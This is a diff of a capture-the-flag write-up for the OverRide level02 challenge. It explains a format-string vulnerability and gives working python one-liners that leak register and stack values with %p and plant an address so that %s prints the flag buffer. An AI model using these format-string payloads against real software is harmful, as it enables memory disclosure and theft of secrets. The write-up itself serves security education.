@@ -8,7 +8,7 @@ We find out a vulnerable printf of type printf(buf) gets used with our username.
 Format string exploitation time !
 
 We are able to leak memory content of the program.
-As we are in Linux x86 64 bit, 6 registers are used for the printf() parameters : rdi | rsi | rdx | rcx | r8 | r9, next arguments would be put on the stack, in reverse order.
+As we are in Linux x86 64 bit, 6 registers are used for the printf() parameters : rdi | rsi | rdx | rcx | r8 | r9, next arguments would be put on the stack.
 
 Let's leak all the register values. rdi cannot be leaked as it is our first argument to printf --> our username.
 level02@OverRide:~$ python -c 'print "%p " * 5 + "\n" + "Password"' | ./level02                                                                       
@@ -21,14 +21,15 @@ level02@OverRide:~$ python -c 'print "%p " * 5 + "\n" + "Password"' | ./level02
 RSI(pass_buf)  RDX   RCX  R8                 R9
 
 All the values that come after are values from the stack starting at rsp (see x86 64 bit calling convention = https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/)
-Thanks to that, we will be able to read all the contents of the stack, and our flag is in there !! ;)
+Thanks to that, we will be able to read all the contents of the stack, and our flag is in there !! ;) (the flag is read and put in a buffer)
 
 The top of the stack for us is the 6th argument to printf (as the first 5 arguments were taken from the registers)
 
 We know our flag buffer is at rbp-0xa0 (so at rsp+0x80 as stackframe size == 288 --> and 288 - 0xa0 == 0x80 | 128)
 
-Therefore, the printf() "argument" that will hold our flag is at offset 6 + (128/8) --> 22
+Therefore, the printf() "argument" that will hold our flag is at offset 6 (to skip registers) + (rsp offset of 128/8 == 16) --> 22
 
+We know the flag buffer is 41 bytes, so let's read 5 values of size 8 (40) at "argument" 22. (buf[41] is only a null byte)
 level02@OverRide:~$ python -c 'print "REGISTERS = " + "%p " * 5 + "|| STACK VALUES = " + "%22$p " + "%23$p " + "%24$p " + "%25$p " + "%26$p " + "\n" + "Password"' | ./level02 
 ===== [ Secure Access System v1.0 ] =====
 /***************************************\
@@ -42,9 +43,11 @@ Here is the flag ! (in hex and little endian)
 Let's force printf() to print the flag as a string with %s.
 In order to do this, we need the address of the string holding the flag.
 
-The flag buffer comes right after pass_buf in memory, so let's get the address of flag_buf == 0x7fffffffe4c0 + 112 (0x110-0xa0 == 112) = 0x7fffffffe530
+The flag buffer comes right after password_buf in memory, so let's get the address of flag_buf.
+We were able to leak the address of password buf, as it was in the RSI register (0x7fffffffe4c0).
+0x7fffffffe4c0 + 112 (0x110-0xa0 == 112) = 0x7fffffffe530
 
-Now that we have the address of the flag string, we can push this address on the stack through our password input, and then make printf() print what is at this address --> the flag
+Now that we have the address of the flag string, we can push this address on the stack through our PASSWORD input, and then make printf() print what is at this address --> the flag
 
 level02@OverRide:~$ python -c 'print "REGISTERS = " + "%p " * 5 + "|| STACK VALUES = " + "%p " * 2 + "%p" + "\n" + "\x30\xe5\xff\xff\xff\x7f"' | ./level02 
 ===== [ Secure Access System v1.0 ] =====
